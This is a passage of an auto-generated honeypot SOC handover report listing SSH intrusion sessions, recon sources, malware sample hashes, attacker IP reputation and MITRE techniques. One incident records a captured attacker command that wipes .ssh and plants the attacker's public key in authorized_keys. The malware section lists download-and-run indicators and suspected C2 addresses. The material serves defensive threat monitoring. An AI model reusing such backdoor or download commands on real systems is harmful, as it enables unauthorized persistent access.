| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:38:11` | `cowrie.session.connect` |
| `2026-07-02 20:38:11` | `cowrie.client.version` |
| `2026-07-02 20:38:11` | `cowrie.client.kex` |
| `2026-07-02 20:38:12` | `cowrie.login.success` |
| `2026-07-02 20:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c46babbbcc91

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 20:40 |
| **Last Seen** | 2026-07-02 20:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:40:18` | `cowrie.session.connect` |
| `2026-07-02 20:40:19` | `cowrie.client.version` |
| `2026-07-02 20:40:19` | `cowrie.client.kex` |
| `2026-07-02 20:40:20` | `cowrie.login.success` |
| `2026-07-02 20:40:21` | `cowrie.session.params` |
| `2026-07-02 20:40:21` | `cowrie.command.input` |
| `2026-07-02 20:40:22` | `cowrie.log.closed` |
| `2026-07-02 20:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b8952b0bc1

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]72` |
| **First Seen** | 2026-07-02 20:43 |
| **Last Seen** | 2026-07-02 20:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:43:16` | `cowrie.session.connect` |
| `2026-07-02 20:43:16` | `cowrie.client.version` |
| `2026-07-02 20:43:16` | `cowrie.client.kex` |
| `2026-07-02 20:43:17` | `cowrie.login.success` |
| `2026-07-02 20:43:18` | `cowrie.session.params` |
| `2026-07-02 20:43:18` | `cowrie.command.input` |
| `2026-07-02 20:43:18` | `cowrie.command.failed` |
| `2026-07-02 20:43:19` | `cowrie.log.closed` |
| `2026-07-02 20:43:20` | `cowrie.session.params` |
| `2026-07-02 20:43:20` | `cowrie.command.input` |
| `2026-07-02 20:43:20` | `cowrie.session.file_download` |
| `2026-07-02 20:43:20` | `cowrie.log.closed` |
| `2026-07-02 20:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61b830a69ab2

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]72` |
| **First Seen** | 2026-07-02 20:43 |
| **Last Seen** | 2026-07-02 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:43:20` | `cowrie.session.connect` |
| `2026-07-02 20:43:20` | `cowrie.client.version` |
| `2026-07-02 20:43:21` | `cowrie.client.kex` |
| `2026-07-02 20:43:22` | `cowrie.login.success` |
| `2026-07-02 20:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b5f11c7d3a

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]72` |
| **First Seen** | 2026-07-02 20:43 |
| **Last Seen** | 2026-07-02 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:43:22` | `cowrie.session.connect` |
| `2026-07-02 20:43:22` | `cowrie.client.version` |
| `2026-07-02 20:43:22` | `cowrie.client.kex` |
| `2026-07-02 20:43:23` | `cowrie.login.success` |
| `2026-07-02 20:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-550eccf8b670

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 20:45 |
| **Last Seen** | 2026-07-02 20:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:45:30` | `cowrie.session.connect` |
| `2026-07-02 20:45:32` | `cowrie.client.version` |
| `2026-07-02 20:45:32` | `cowrie.client.kex` |
| `2026-07-02 20:45:38` | `cowrie.login.success` |
| `2026-07-02 20:45:41` | `cowrie.session.params` |
| `2026-07-02 20:45:41` | `cowrie.command.input` |
| `2026-07-02 20:45:43` | `cowrie.log.closed` |
| `2026-07-02 20:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9628fbe4360d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 20:54 |
| **Last Seen** | 2026-07-02 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:54:29` | `cowrie.session.connect` |
| `2026-07-02 20:54:29` | `cowrie.client.version` |
| `2026-07-02 20:54:29` | `cowrie.client.kex` |
| `2026-07-02 20:54:31` | `cowrie.login.success` |
| `2026-07-02 20:54:32` | `cowrie.session.params` |
| `2026-07-02 20:54:32` | `cowrie.command.input` |
| `2026-07-02 20:54:33` | `cowrie.log.closed` |
| `2026-07-02 20:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.99.74[.]35` | **340** | 2026-07-02 19:25 | 2026-07-02 20:09 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **12** | 2026-07-02 19:02 | 2026-07-02 20:40 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `64.89.162[.]15` | **6** | 2026-07-02 19:23 | 2026-07-02 20:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **4** | 2026-07-02 19:12 | 2026-07-02 20:53 | 3m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | **3** | 2026-07-02 20:30 | 2026-07-02 20:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-02 19:58 | 2026-07-02 19:59 | 42s | 0 | `T1592` | 🟢 LOW |
| `120.48.84[.]64` | 1 | 2026-07-02 20:44 | 2026-07-02 20:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `13.94.39[.]162` | 1 | 2026-07-02 19:54 | 2026-07-02 19:54 | 16s | 0 | `T1592` | 🟢 LOW |
| `14.103.46[.]139` | 1 | 2026-07-02 18:56 | 2026-07-02 18:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `173.167.241[.]28` | 1 | 2026-07-02 19:59 | 2026-07-02 19:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-07-02 20:29 | 2026-07-02 20:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-07-02 19:08 | 2026-07-02 19:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]139` | 1 | 2026-07-02 19:41 | 2026-07-02 19:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]140` | 1 | 2026-07-02 19:42 | 2026-07-02 19:42 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]184` | 1 | 2026-07-02 19:44 | 2026-07-02 19:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]214` | 1 | 2026-07-02 19:42 | 2026-07-02 19:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]215` | 1 | 2026-07-02 19:41 | 2026-07-02 19:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.154.143[.]136` | 1 | 2026-07-02 19:16 | 2026-07-02 19:17 | 42s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-07-02 19:22 | 2026-07-02 19:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-07-02 19:06 | 2026-07-02 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]234` | 1 | 2026-07-02 19:00 | 2026-07-02 19:00 | 16s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-02 19:39 | 2026-07-02 19:40 | 43s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]169` | 1 | 2026-07-02 19:44 | 2026-07-02 19:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-07-02 19:18 | 2026-07-02 19:18 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.95.234[.]23` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 33 |
| `195.184.76[.]184` | US | FR ONYPHE | **100** ⚠️ | 33 |
| `91.230.168[.]169` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `120.48.84[.]64` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 26 |
| `212.112.19[.]163` | FI | PRIVATE INTERNET ACCESS, Inc Url: https://privateinternetaccess.com/ | **100** ⚠️ | 15 |
| `172.236.228[.]193` | US | Linode | **100** ⚠️ | 50 |
| `117.218.75[.]251` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 8 |
| `171.244.39[.]95` | VN | Viettel Group | **100** ⚠️ | 24 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `195.184.76[.]140` | US | FR ONYPHE | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 127 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 107 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 502 cases |
| Tool 34  | Credential Extractor        | ✅ 159 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 55 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (2.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 2 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 107 priority case(s) shown individually · 24 recon entry/entries in table (5 group(s) consolidating 365 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T21:13:38Z_
